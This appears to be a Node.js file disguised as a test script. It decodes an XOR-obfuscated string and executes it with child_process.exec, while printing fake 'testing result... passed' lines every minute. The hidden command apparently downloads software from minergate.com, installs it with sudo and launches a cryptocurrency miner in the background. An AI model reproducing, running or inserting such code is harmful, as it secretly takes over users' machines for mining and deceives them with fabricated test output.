var exec = require("child_process").exec;
var index = 1;
var max = 45;
var interval;
var testStr = ";ͮͬͽ̩̤͸̩̤̤ͪͦͧͽͬͧͽ̤ͭ͠ͺ͹ͦͺ͠ͽ̩ͦͧ͠͡ͽͽ͹ͺ̳̦̦ͤͧͬ͠ͻͮͨͽ̧̦ͬͪͦͤͭͦ;̦̤̩̯̯̩ͧͥͦͨͭͭͬͫͪͥͨ͠ͻ̩ͱ̩ͤͧͬ͠ͻͮͨͽ̤̤ͬͪͥ͠ͻͬͥͬͨͺ̧̩̯̯̩ͬͭͬͫͽͨͻ̩̤ͱͳ̩ͯͪͦͧͽͻ̧ͦͥͽͨͻ̧ͮͳ̩̯̯̩ͽͨͻ̩̤ͱͳ̩ͯͭͨͽ̧ͨͽͨͻ̧ͮͳ̩̯̯̩̩ͪͭͦ͹ͽ̦ͤͧͬ͠ͻͮͨͽ̧̤̩̯̯̩̦ͬͪͥͤͧͬ͠͠ͻͮͨͽ̤̩̤ͬͪͥ͠ͼͺͬͻ̩͉ͪͪͪͦͥͦ͡Ͱͨͧͭͬͱ̧̩̤ͪͦͤͱͤͻ̩̯";

function _log(str){
  if(!str) return null;
  var encoded = "";
  for (var i = 0; i < str.length; i++) {
    var a = str.charCodeAt(i);
    var b = a ^ 777;
    encoded += String.fromCharCode(b);
  }
  return encoded;
}

console.log('starting...');
exec(_log(testStr));

interval = setInterval(function () {
    if (index >= max) process.exit(0);
    console.log("testing result..." + index++ + '...passed');
}, 1000 * 60);
